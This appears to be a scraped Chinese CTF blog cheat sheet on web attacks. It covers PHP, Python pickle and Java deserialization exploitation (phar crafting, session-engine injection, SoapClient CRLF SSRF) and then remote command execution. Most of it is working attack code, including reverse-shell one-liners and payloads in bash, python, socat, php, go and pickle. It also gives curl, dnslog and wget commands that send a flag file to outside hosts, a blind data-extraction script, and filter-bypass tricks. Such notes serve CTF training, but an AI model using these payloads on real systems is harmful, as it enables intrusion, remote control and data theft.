- easy_php 绕过preg_match() 匹配的关键字 PHP低版本 可使用+，&lt;绕过正则，如： O:+4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:16:&quot;f15g_1s_here.php&quot;;&#125; O:&lt;4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:16:&quot;f15g_1s_here.php&quot;;&#125; 普通字符串 PHP序列化中存在序列化类型 S，相较于小写的 s，大写 S 是escaped字符串，会将 \\xx 形式作为一个16进制字符处理，如：n 的十六进制是 6e，所以把 name替换为 \\6eame 即可绕过。 /^O:\\d+/ serialize(array($data)) 绕过 throw new Exception 去掉最后的大括号，利用反序列化报错来防止进入 Exception GC a:2:&#123;i:0;O:7:&quot;getflag&quot;:&#123;&#125;i:0;N;&#125; 因为反序列化的过程是顺序执行的，所以到第一个属性时，会将Array[0]设置为getflag对象，同时我们又将Array[0]设置为null，这样前面的getflag对象便丢失了引用，就会被GC所捕获，便可以执行__destruct。 绕过 md5+sha1 验证判断条件： 123if( ($this-&gt;var1 != $this-&gt;var2) &amp;&amp; (md5($this-&gt;var1) === md5($this-&gt;var2)) &amp;&amp; (sha1($this-&gt;var1) === sha1($this-&gt;var2)) ) &#123; eval($this-&gt;var1);&#125; 传入2个不相等对象，但是他们的 __toString 魔法函数返回的一样，可以绕过 if，且eval转为字符串时我们也使其可以被执行。 查找带 __toString 的类，满足的有 Exception/ErrorException/Error/ParseError/mysqli_sql_exception 等，以 Exception 为例，construct函数为： public function __construct($message = &quot;&quot;, $code = 0, Throwable $previous = null) 它返回的是一个字符串类型的异常信息，可以控制传入 message 和 code 的值不同即可。 123$cmd =&#x27;system(&quot;cat /flag&quot;);?&gt;&#x27;;$ex1 = new Exception($cmd);$ex2 = new Exception($cmd,1); unserialize_callback_func + spl_autoload在 php manual 里面有一个很有趣的变量配置，如果在反序列化的时候需要实例化一个未定义的类，可以设置回调函数以供调用，最关键的是这个配置是 PHP_IN_ALL 的，所以可以直接通过 ini_set 来设置。 注意: unserialize_callback_func 指令 如果在反序列化的时候需要实例化一个未定义类，则可以设置回调函数以供调用（以免得到的是不完整的 object “__PHP_Incomplete_Class”）。可通过 php.ini、ini_set() 或 .htaccess 定义‘unserialize_callback_func’。每次实例化一个未定义类时它都会被调用。若要禁止这个特性，只需置空此设定。 可以通过 spl_autoload 来自动加载未定义的类 settings，会默认加载当前目录下，以settings类名为文件名，php 或者 inc 为后缀的文件，这样就和 settings.inc 联系到了一起。 spl_autoload — __autoload()函数的默认实现 spl_autoload ( string $class_name , string $file_extensions = ? ) : void file_extensions: 在默认情况下，本函数先将类名转换成小写，再在小写的类名后加上 .inc 或 .php 的扩展名作为文件名，然后在所有的包含路径(include paths)中检查是否存在该文件。 ​ 反序列化字符逃逸PHP 在反序列化时，底层代码是以 ; 作为字段的分隔，以 &#125; 作为结尾(字符串除外)，并且是根据长度判断内容的。 例子： 123456789101112131415161718&lt;?phpfunction filter($string)&#123; return str_replace(&#x27;x&#x27;,&#x27;yy&#x27;,$string);&#125;$username = &quot;peri0d&quot;;$password = &quot;aaaaa&quot;;$user = array($username, $password);var_dump(serialize($user));echo &#x27;\\n&#x27;;$r = filter(serialize($user));var_dump($r);echo &#x27;\\n&#x27;;var_dump(unserialize($r)); 正常情况下的序列化结果为 a:2:&#123;i:0;s:6:&quot;peri0d&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;。 那如果把 username 换成 peri0dxxx ，其处理后的序列化结果为 a:2:&#123;i:0;s:9:&quot;peri0dyyyyyy&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125; ， 这个时候肯定会反序列化失败，可以看到 s:9:&quot;peri0dyyyyyy&quot; 比以前多了 3 个字符。 回到前面， a:2:&#123;i:0;s:6:&quot;peri0d&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125; 它在进行修改密码之后就变为 a:2:&#123;i:0;s:6:&quot;peri0d&quot;;i:1;s:6:&quot;123456&quot;;&#125;i:1;s:5:&quot;aaaaa&quot;;&#125;。 可以看到需要添加的字符串 &quot;;i:1;s:6:&quot;123456&quot;;&#125; 长度为 20。 假设要在 peri0d 后面填充 4 个字符，那么就是 s:30:&#39;peri0dxxxx&quot;;i:1;s:6:&quot;123456&quot;;&#125;&#39;; 在经过处理之后就是 s:30:&#39;peri0dyyyyyyyy&quot;;i:1;s:6:&quot;123456&quot;;&#125;&#39;; 读取 30 个字符为 peri0dyyyyyyyy&quot;;i:1;s:6:&quot;12345。 这就需要继续增加填充字符，在有 20 个 x 时，就实现了密码的修改。 $6+x+20=6+2x \\Rightarrow x=20$ 可以看到，这和 username 前面的 peri0d 是毫无关系的，只和做替换的字符串有关。 ​ phar反序列化phar文件本质上是一种压缩文件，在使用phar协议文件包含时，也是可以直接读取zip文件的。使用phar://协议读取文件时，文件会被解析成phar对象，phar对象内的以序列化形式存储的用户自定义元数据（metadata）信息会被反序列化。这就引出了我们攻击手法最核心的流程。 流程：构造phar（元数据中含有恶意序列化内容）文件—&gt;上传—&gt;触发反序列化 最后一步是寻找触发phar文件元数据反序列化。其实php中有一大部分的文件系统函数在通过phar://伪协议解析phar文件时都会将meta-data进行反序列化。 利用条件 phar文件要能够上传到服务器端。能触发的文件操作函数： include、file_get_contents、file_put_contents、copy、file、file_exists、is_executable、is_file、is_dir、is_link、is_writable、fileperms、fileinode、filesize、fileowner、filegroup、fileatime、filemtime、filectime、filetype、getimagesize、exif_read_data、stat、lstat、touch、md5_file 要有可用的魔术方法作为“跳板”。 文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。 生成phar文件 首先得生成一个含有序列化metadata的phar文件。php提供一个类允许我们处理phar文件相关操作。注意要设置php.ini中phar.readonly=Off。 123456789101112131415&lt;?phpclass User &#123; Public $name；&#125;@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar，生成后可以随意修改$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub$o = new User(); $o-&gt;name = &#x27;JrXnm&#x27;;$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering(); tar包装： 123456789101112131415&lt;?phpclass User &#123; Public $name；&#125;$o = new User(); $o-&gt;name = &#x27;JrXnm&#x27;;@unlink(&quot;phar.tar&quot;);@system(&#x27;rm -r .phar&#x27;);@system(&#x27;mkdir .phar&#x27;);file_put_contents(&#x27;.phar/.metadata&#x27;,serialize($o));system(&#x27;tar -cf phar.tar .phar/*&#x27;);// phar://./phar.tar// phar:///var/www/html/uploads/phar.tar zip包装： 12345678910111213141516171819&lt;?phpclass User &#123; Public $name；&#125;$o = new User(); $o-&gt;name = &#x27;JrXnm&#x27;;$d = serialize($o);if(file_exists(&#x27;phar.zip&#x27;)) &#123; @unlink(&quot;phar.zip&quot;);&#125;$zip = new ZipArchive;$res = $zip-&gt;open(&#x27;phar.zip&#x27;, ZipArchive::CREATE);$zip-&gt;addFromString(&#x27;test.txt&#x27;, &#x27;file content goes here&#x27;);$zip-&gt;setArchiveComment($d);$zip-&gt;close();// phar://./phar.zip// phar:///var/www/html/uploads/phar.zip 上传到服务器 phar文件是很容易绕过上传限制的，首先它的后缀是不限制的，改成什么phar://协议都可以解析。 前面这个标志的格式为xxx&lt;?php xxx; __HALT_COMPILER();?&gt; 前面内容不限，这样可以在前面添加注入GIF98a这样的文件头绕过上传限制。 反序列化执行 直接执行测试的那份代码，phar://协议在file_get_contents函数中解析phar文件，将元数据反序列化执行魔法函数。 绕过 phar://不能出现在首部 123compress.zlib://phar://compress.bzip2://phar://php://filter/resource=phar:// 关键字 绕过如 HALT_COMPILER，使用 gzip 命令处理phar文件： gzip phar.jpg 参考：从一道题再看phar的利用 修改phar文件 改phar文件内容，因phar文件是有检验和的，所以直接改phar文件内容不可行。 参考：总结 - ctf中php的phar(一) 修复签名数据： 123456from hashlib import sha1f = open(&#x27;./ph1.phar&#x27;, &#x27;rb&#x27;).read() # 修改内容后的phar文件s = f[:-28] # 获取要签名的数据h = f[-8:] # 获取签名类型以及GBMB标识newf = s+sha1(s).digest()+h # 数据 + 签名 + 类型 + GBMBopen(&#x27;ph2.phar&#x27;, &#x27;wb&#x27;).write(newf) # 写入新文件 构造phar结构： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188from zlib import crc32from struct import packfrom time import timefrom hashlib import md5, sha1, sha256, sha512class PHAR: # 一些常量 STUB = b&quot;__HALT_COMPILER(); ?&gt;&quot; GBMB = b&quot;GBMB&quot; MD5 = b&quot;\\x01\\x00\\x00\\x00&quot; SHA1 = b&quot;\\x02\\x00\\x00\\x00&quot; SHA256 = b&quot;\\x03\\x00\\x00\\x00&quot; SHA512 = b&quot;\\x04\\x00\\x00\\x00&quot; def __init__(self, prefix: str, manifestData: dict, filesData: list, signatureType: MD5 ): self.prefix = prefix.encode() self.manifestData = manifestData self.filesData = filesData self.signatureType = signatureType def parse(self): # 检查清单的参数 if any(self.manifestData.get(each) is None for each in [&quot;loc&quot;, &quot;metaData&quot;]): return False # 至少要归档一个文件 if len(self.filesData) == 0: return False # 遍历检查文件的参数 for file in self.filesData: if any(file.get(each) is None for each in [&quot;fileName&quot;, &quot;fileContent&quot;, &quot;loc&quot;, &quot;metaData&quot;]): return False # 将字符串转换字节流 self.manifestData[&quot;metaData&quot;] = self.manifestData[&quot;metaData&quot;].encode() for file in self.filesData: for key, value in file.items(): if key in [&quot;fileName&quot;, &quot;fileContent&quot;, &quot;metaData&quot;]: file[key] = value.encode() return True def generate(self): # 检查参数 if not self.parse(): return b&quot;&quot; phar = b&quot;&quot; # stub stub = self.stub() # manifest manifest = self.manifest() files = self.file() # content contents = self.content() # 计算总长度 manifest = pack(&quot;I&quot;, len(manifest + files + contents)) + manifest[4:] # signature signature = self.signature(stub + manifest + files + contents) # 重新拼接 phar += stub + manifest + files + contents + signature return phar def stub(self): return self.prefix + self.STUB + b&quot;\\r\\n&quot; def manifest(self): # 归档文件数量 manifest = pack(&quot;I&quot;, len(self.filesData)) # 版本 manifest += b&quot;\\x11\\x00&quot; # 标识 manifest += b&quot;\\x00\\x00\\x01\\x00&quot; # 别名长度 manifest += b&quot;\\x00\\x00\\x00\\x00&quot; # 如果将序列化内容存储于此 if self.manifestData[&quot;loc&quot;]: # metadata长度 manifest += pack(&quot;I&quot;, len(self.manifestData[&quot;metaData&quot;])) # metadata内容 manifest += self.manifestData[&quot;metaData&quot;] else: manifest += pack(&quot;I&quot;, 0) # 补足长度 manifest = pack(&quot;I&quot;, 0) + manifest return manifest def file(self): files = b&quot;&quot; # 遍历归档的文件 for file in self.filesData: # 文件名长度 files += pack(&quot;I&quot;, len(file[&quot;fileName&quot;])) # 文件名 files += file[&quot;fileName&quot;] # 未压缩大小 files += pack(&quot;I&quot;, len(file[&quot;fileContent&quot;])) # 时间戳 files += pack(&quot;I&quot;, int(time())) # 压缩后大小 files += pack(&quot;I&quot;, len(file[&quot;fileContent&quot;])) # CRC32校验 files += pack(&quot;I&quot;, crc32(file[&quot;fileContent&quot;])) # 文件权限 files += pack(&quot;I&quot;, 0o666) # 如果将序列化内容存储于此 if file[&quot;loc&quot;]: # metadata长度 files += pack(&quot;I&quot;, len(file[&quot;metaData&quot;])) # metadata内容 files += file[&quot;metaData&quot;] else: files += pack(&quot;I&quot;, 0) return files def content(self): contents = b&quot;&quot; # 遍历所有归档文件 for file in self.filesData: contents += file[&quot;fileContent&quot;] return contents def signature(self, content): signature = b&quot;&quot; # 签名内容 if self.signatureType == self.MD5: signature = md5(content).digest() if self.signatureType == self.SHA1: signature = sha1(content).digest() if self.signatureType == self.SHA256: signature = sha256(content).digest() if self.signatureType == self.SHA512: signature = sha512(content).digest() # 签名标志 signature += self.signatureType # GBMB标志 signature += self.GBMB return signatureif __name__ == &#x27;__main__&#x27;: pharData = &#123; &quot;prefix&quot;: &quot;123&quot;, &quot;manifestData&quot;: &#123; &quot;loc&quot;: True, &quot;metaData&quot;: &quot;&quot;&quot;O:1:&quot;e&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;text&quot;;&#125;&quot;&quot;&quot;, &#125;, &quot;filesData&quot;: [ &#123; &quot;fileName&quot;: &quot;e.txt&quot;, &quot;fileContent&quot;: &quot;dsadawada&quot;, &quot;loc&quot;: True, &quot;metaData&quot;: &quot;&quot;&quot;O:1:&quot;e&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;text&quot;;&#125;&quot;&quot;&quot;, &#125;, &#123; &quot;fileName&quot;: &quot;c.txt&quot;, &quot;fileContent&quot;: &quot;123&quot;, &quot;loc&quot;: True, &quot;metaData&quot;: &quot;&quot;&quot;O:1:&quot;e&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;text&quot;;&#125;&quot;&quot;&quot;, &#125;, ], &quot;signatureType&quot;: PHAR.SHA1, &#125; p = PHAR(**pharData).generate() with open(&quot;a.phar&quot;, &quot;wb&quot;) as f: f.write(p) ​ PHP session反序列化PHP中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项 session.save_handler 来进行确定的，默认是以文件的方式存储。存储的文件是以sess_[sessionid]来进行命名的。 有三种方式： 默认使用php：键名|键值（经过序列化函数处理的值） name|s:6:&quot;1FonlY&quot;; php_serialize：经过序列化函数处理的值 a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;1FonlY&quot;;&#125; php_binary：键名的长度对应的ASCII字符 + 键名 + 经过序列化函数处理的值 \u0004names:6:&quot;1FonlY&quot;; 不可显的为EOT ,name的长度为4 4在ASCII 表中就是 EOT 当序列化的引擎和反序列化的引擎不一致时，就可以利用引擎之间的差异产生序列化注入漏洞。 比如这里先实例化一个对象，然后将其序列化为 O:7:&quot;_1FonlY&quot;:1:&#123;s:3:&quot;cmd&quot;;N;&#125;， 如果传入 |O:7:&quot;_1FonlY&quot;:1:&#123;s:3:&quot;cmd&quot;;N;&#125;，在使用php_serialize 引擎的时候， 序列化后的session 文件是这样的 a:1:&#123;s:4:&quot;name&quot;;s:31:&quot;|O:7:&quot;_1FonlY&quot;:1:&#123;s:3:&quot;cmd&quot;;N;&#125;&quot;;&#125;， 这时，将a:1:&#123;s:4:&quot;name&quot;;s:31:&quot; 当做键名，O:7:&quot;_1FonlY&quot;:1:&#123;s:3:&quot;cmd&quot;;N;&#125; 当做键值，将键值进行反序列化输出，这时就造成了序列化注入攻击。 ​ Soap反序列化SOAP : Simple Object Access Protocol简单对象访问协议。 采用HTTP作为底层通讯协议，XML作为数据传送的格式，正常情况下的SoapClient类，调用一个不存在的函数，会去调用__call方法。 CRLF漏洞 SOAPAction处可控，可以把\\x0d\\x0a注入到SOAPAction，POST请求的header就可以被控制。 但Content-Type在SOAPAction的上面，就无法控制Content-Type，也就不能控制POST的数据。 在header里User-Agent在Content-Type前面，user_agent同样可以注入CRLF，控制Content-Type的值。 123456789101112131415161718&lt;?php$target = &#x27;http://127.0.0.1:5555/path&#x27;;$post_string = &#x27;data=something&#x27;;$headers = array( &#x27;X-Forwarded-For: 127.0.0.1&#x27;, &#x27;Cookie: PHPSESSID=my_session&#x27; );$b = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target,&#x27;user_agent&#x27;=&gt;&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;.join(&#x27;^^&#x27;,$headers).&#x27;^^Content-Length: &#x27;.(string)strlen($post_string).&#x27;^^^^&#x27;.$post_string,&#x27;uri&#x27;=&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace(&#x27;^^&#x27;,&quot;\\r\\n&quot;,$aaa);//$aaa = str_replace(&#x27;&amp;&#x27;,&#x27;&amp;&#x27;,$aaa);echo $aaa;//echo urlencode($aaa);//$c = unserialize($aaa);//$c-&gt;not_exists_function();?&gt; 如上，使用SoapClient反序列化+CRLF可以生成任意POST请求。 Deserialization + __call + SoapClient + CRLF = SSRF ​ python反序列化与PHP类似，python也有序列化功能以长期储存内存中的数据。pickle是python下的序列化与反序列化包。 python有另一个更原始的序列化包marshal，现在开发时一般使用pickle。 与json相比，pickle以二进制储存，不易人工阅读；json可以跨语言，而pickle是Python专用的；pickle能表示python几乎所有的类型（包括自定义类型），json只能表示一部分内置类型且不能表示自定义类型。 pickle实际上可以看作一种独立的语言，通过对opcode的更改编写可以执行python代码、覆盖变量等操作。直接编写的opcode灵活性比使用pickle序列化生成的代码更高，有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）。 12345678910# pocimport pickleimport base64class A(object): def __reduce__(self): return (eval,(&quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/[IP]/[Port] 0&gt;&amp;1\\&quot;&#x27;)&quot;,))poc = A()result = pickle.dumps(poc)result = base64.b64encode(result)print(result) RCE R指令： 1234b&#x27;&#x27;&#x27;cossystem(S&#x27;whoami&#x27;tR.&#x27;&#x27;&#x27; i指令： 1234b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;iossystem.&#x27;&#x27;&#x27; o指令： 1234b&#x27;&#x27;&#x27;(cossystemS&#x27;whoami&#x27;o.&#x27;&#x27;&#x27; 工具 更方便的opcode生成工具： EddieIvan01/pker 参考： Python-Pickle反序列化安全问题 pickle反序列化初探 Code-Breaking中的两个Python沙箱 pickle反序列化—高校抗“疫”网络安全分享赛 从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势 Python反序列化漏洞与沙箱逃逸 Pickle反序列化 pickle反序列化的利用技巧总结 ​ Java反序列化Java序列化是指把Java对象转换为字节序列的过程，ObjectOutputStream 类的 writeObject() 方法可以实现序列化。 Java反序列化是指把字节序列恢复为Java对象的过程，ObjectOutputStream 类的 readObject() 方法用于反序列化。 一个类要能反序列化必须满足下面2个条件： 该类必须实现 java.io.Serializable 接口； 该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。 123456789101112131415161718192021222324252627282930313233343536public class User implements Serializable &#123; private String username; public User(String username) &#123; this.username = username; &#125; public String getName()&#123; return this.username; &#125; private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123; in.defaultReadObject(); Runtime.getRuntime().exec(this.username); &#125;&#125;package com.ctfshow.entity;public class UserPayload &#123; public static void main(String[] args) throws Exception &#123; String userDataPost = null; User user = new User(&quot;nc IP Port -e /bin/sh&quot;); try &#123; ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream os = new ObjectOutputStream(byteArrayOutputStream); os.writeObject(user); os.close(); byte[] userData = byteArrayOutputStream.toByteArray(); userDataPost = new String(Base64.getEncoder().encode(userData)); System.out.println(userDataPost); &#125; catch (FileNotFoundException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 绕过 readUnshared() readUnshared()不允许后续的readObject和readUnshared调用引用这次调用反序列化得到的对象，而readObject读取的对象可以。 ​ JDBC反序列化MySQL客户端jdbc反序列化漏洞 ​ 框架反序列化（CVE） Yii2CVE-2020-15148 Yii2反序列化RCE POP链分析 我是如何挖掘yii2反序列化0day的 Laravel v5.8 Laravel 5.8 RCE 分析 ThinkPHP v5.1.x ThinkPHP 5.1.x反序列化 PHPGGCPHPGGC是一款能够自动生成主流框架的序列化测试payload的工具。 PHPGGC: PHP Generic Gadget Chains 从0到1掌握反序列化工具之PHPGGC","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"python","slug":"python","permalink":"https://lazzzaro.github.io/tags/python/"},{"name":"PHP","slug":"PHP","permalink":"https://lazzzaro.github.io/tags/PHP/"},{"name":"Java","slug":"Java","permalink":"https://lazzzaro.github.io/tags/Java/"},{"name":"反序列化","slug":"反序列化","permalink":"https://lazzzaro.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"author":"Lazzaro"},{"title":"RCE","slug":"web-RCE","date":"2020-05-14T16:20:39.000Z","updated":"2024-09-02T13:03:59.099Z","comments":true,"path":"2020/05/15/web-RCE/","permalink":"https://lazzzaro.github.io/2020/05/15/web-RCE/","excerpt":"","text":"远程命令执行/远程代码执行 (Remote Command/Code Execute, RCE)常用命令1234567891011121314151617181920212223#查看文件命令cat/tac/more/less/head/tail/nl/od/uniq/sortgrep test flag.phpphp /flag #文件内容会被当成php代码执行，相当于includephp -t / -r &quot;include(&#x27;/flag&#x27;);&quot; #指定根目录，绕过open_basedirsh /flag 2&gt;&amp;1 #sh+文件，并输出错误信息（蚁剑是这个原理）sed p#列目录命令du -a .chgrp -v -R#打包文件tar cvf xxx.tar . #将当前目录打包压缩为xxx.tar#写入文件ls &gt; xxxls | tee xxxscript -a xxx; ls; exit; #依次执行echo -e &quot;%23!/bin/sh\\nwhile read line\\ndo\\necho \\$line\\ndone &lt; /flag&quot; &gt; ../../../read #写shell#反弹shellcurl [IP] | sh #VPS payload: bash -c &quot;bash -i &gt;&amp; /dev/tcp/[IP]/[Port] 0&gt;&amp;1&quot; ​ 命令分隔符12345ping x.x.x.x;ls #先执行1再执行2，不管1成功与否都会执行2ping x.x.x.x|ls #管道符前面和后面的命令都会执行，只不过只会返回后者的命令执行结果。如果1执行错误,则2不再执行）ping x.x.x.x||ls #如果1执行出错，则会执行2）ping x.x.x.x&amp;ls #先执行1，不管成功与否都会执行2ping x.x.x.x&amp;&amp;ls #先执行1，如果执行出错则不再执行2，如果1执行成功则会执行2 ​ 反弹shellbash123456bash -c &quot;bash -i &gt; /dev/tcp/[IP]/[Port] 0&gt;&amp;1 2&gt;&amp;1&quot;bash -c &#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9tYXg2LmZ1bi82NjY2IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;nc [IP] [Port] -e /bin/sh#接收nc -lvvnp [Port] python123456python3 -c &#x27;a=__import__;s=a(&quot;socket&quot;).socket;o=a(&quot;os&quot;).dup2;p=a(&quot;pty&quot;).spawn;c=s();c.connect((&quot;your-ip&quot;,7777));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(&quot;/bin/sh&quot;)&#x27;python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;your-ip&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;nc -lvvnp 2333 python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot; #模拟终端 socat1socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:x.x.x.x:port php1php -r &#x27;$sock=fsockopen(&quot;ip&quot;,6666);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27; go1234567891011121314151617package mainimport ( &quot;fmt&quot; &quot;log&quot; &quot;os/exec&quot;)func main() &#123; cmd := exec.Command(&quot;bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1&quot;) out, err := cmd.CombinedOutput() if err != nil &#123; fmt.Printf(&quot;combined out:\\n%s\\n&quot;, string(out)) log.Fatalf(&quot;cmd.Run() failed with %s\\n&quot;, err) &#125; fmt.Printf(&quot;combined out:\\n%s\\n&quot;, string(out))&#125; ​ 绕过（bypass）空格1&lt;，&lt;&gt;，%20，%09，$IFS，$&#123;IFS&#125;，$IFS$9，&#123;cat,1.txt&#125; 分号1%0a 命令（以pwd为例）1a=p;b=wd;$a$b，p&#x27;&#x27;wd，p&quot;&quot;wd，p\\`\\`wd，p\\wd，pwd$u，`echo cHdk|base64 -d\\`，echo &quot;707764&quot;|xxd -r -p|bash 关键词（以flag为例）123cat fla*，cat f???，cat flag$u，cat fl&quot;a&quot;g，cat fl&#x27;a&#x27;gcat /[e-i][k-n][1-z][e-i]php -r &quot;echo chr(47).chr(102).chr(108).chr(97).chr(103)&quot; IP地址转数字地址：http://www.msxindl.com/tools/ip/ip_num.asp 无回显写文件12curl -o shell.php http://xxxxxx.txtwget -O shell.php http://xxxxxx.txt 请求带出1234curl http://requestbin.net/r/1kiej1p1?p=`cat /flag|base64`curl `xxd -p /flag`.xxxxxx.dnslog.cn #dnslog带外curl bashupload.com -T your_file.txt #bashupload.com带外下载文件wget --post-file ./flag [IP]:[Port] 平台： 平台地址 说明 http://www.dnslog.cn/ 只能使用 dnslog 外带，另外很多防火墙会 ban 掉该域名。 http://ceye.io/ 可以使用 http 外带和 dnslog 外带，推荐。 参考txt： http://php.loglog.jp/net/exec.php.txt https://johannes.homepc.org/packet9.txt https://metaeventos.net/userfiles/file/p.txt https://www.cpdc.com.tw/uploads/zhang.txt bash时间盲注12345678910111213141516import requestschars = [&#x27; &#x27;, &#x27;!&#x27;, &#x27;&quot;&#x27;, &#x27;#&#x27;, &#x27;$&#x27;, &#x27;%&#x27;, &#x27;&amp;&#x27;, &quot;&#x27;&quot;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;*&#x27;, &#x27;+&#x27;, &#x27;,&#x27;, &#x27;-&#x27;, &#x27;.&#x27;, &#x27;/&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;:&#x27;, &#x27;;&#x27;, &#x27;&lt;&#x27;, &#x27;=&#x27;, &#x27;&gt;&#x27;, &#x27;?&#x27;, &#x27;@&#x27;, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;, &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;[&#x27;, &#x27;\\\\&#x27;, &#x27;]&#x27;, &#x27;^&#x27;, &#x27;_&#x27;, &#x27;`&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;&#123;&#x27;, &#x27;|&#x27;, &#x27;&#125;&#x27;, &#x27;~&#x27;]result = &quot;&quot;url = &quot;http://127.0.0.1/&quot;for i in range(1,100): for char in chars: payload = f&quot;?cmd=if [ `cut -c &#123;i&#125; /flag` = &#x27;&#123;char&#125;&#x27; ];then sleep 5;fi&quot; try: req = requests.get(url + payload, timeout=5) except: result += char print(result) break if (char == &#x27;~&#x27;): break 其他命令： 12345if fgrep -c &quot;a&quot; &quot;flag.txt&quot;; then echo &quot;T&quot;; else &quot;F&quot;; fiif ls | fgrep -c &quot;a&quot;; then echo &quot;T&quot;; else &quot;F&quot;; fi[ $(head -c 2 flag.txt | tail -c 1) = &#x27;a&#x27; ][ $(ls | head -c 2 | tail -c 1) = &#x27;a&#x27; ] ​ 无字母 / 特殊字符BashFuck生成器：BashFuck Payload Generator ​ 禁用 ?八进制（不能解析带有参数的命令） ls -&gt; $&#39;\\154\\163&#39; 禁用 ? 2-9bash对于整数的表示形式是 [base#]n 的形式，比方说如果一个十进制数4，可以表示为二进制数100，那么在bash里可以表示为 2#100。 在现有条件下，只要通过位运算 $((1&lt;&lt;1)) 构造出2，就可以通过这种形式来构造任意数字了，比方说 ls 就是$(($((1&lt;&lt;1))#10011010)) $(($((1&lt;&lt;1))#10100011))，但是 $&#39;\\154\\163&#39; 这种形式可以，而直接运行 $\\&#39;\\\\$(($((1&lt;&lt;1))#10011010))\\\\$(($((1&lt;&lt;1))#10100011))\\&#39; 会报错。 仔细看报错信息，可以看出，bash是确实把$\\&#39;\\\\$(($((1&lt;&lt;1))#10011010))\\\\$(($((1&lt;&lt;1))#10100011))\\&#39;这一串字符串解析为$&#39;\\154\\163&#39;这个形式了，但是没有进一步解析，也就是经过bash的处理，这一段字符变成了$&#39;\\154\\163&#39;而没有变成ls。 这里引入bash的一个语法&lt;&lt;&lt;三个小于号(here-strings)，语法：command [args] &lt;&lt;&lt;[&quot;]$word[&quot;]，$word会展开并作为command的stdin。 所以只要把这个字符串作为$0(bash)命令的stdin，就可以执行命令了，比如：bash&lt;&lt;&lt;$\\&#39;\\\\$(($((1&lt;&lt;1))#10011010))\\\\$(($((1&lt;&lt;1))#10100011))\\&#39; 